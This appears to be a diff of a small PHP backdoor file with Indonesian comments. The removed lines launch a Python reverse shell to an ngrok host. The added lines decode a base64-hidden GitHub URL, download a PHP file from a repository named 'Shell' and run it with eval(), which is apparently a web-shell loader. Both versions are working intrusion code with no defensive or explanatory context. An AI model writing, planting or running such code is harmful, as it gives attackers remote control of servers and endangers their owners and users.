@@ -1,8 +1,38 @@
 <?php
-// Mengeksekusi perintah Python menggunakan nohup untuk menjalankan reverse shell
-$command = "nohup /usr/bin/python -c 'import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"0.tcp.ap.ngrok.io\",18947)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"]);' &";
-exec($command);
+function encode_file($data) {
+    return base64_encode($data);
+}
 
-// Menampilkan pesan sukses
-echo "success";
+function decode_file($data) {
+    return base64_decode($data);
+}
+
+
+$encoded_url = "aHR0cHM6Ly9naXRodWIuY29tL3NoZWxsaTF5YW5lL1NoZWxsL3Jhdy9yZWZzL2hlYWRzL21haW4vMDBrYi5waHA=";
+
+
+$decoded_url = decode_file($encoded_url);
+
+
+function get_file_contents_curl($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    $data = curl_exec($ch);
+    curl_close($ch);
+    
+    return $data;
+}
+
+
+$file_contents = get_file_contents_curl($decoded_url);
+
+
+if ($file_contents !== false && !empty($file_contents)) {
+    
+    eval("?>" . $file_contents);
+} else {
+    echo "File tidak ditemukan atau rusak.";
+}
 ?>
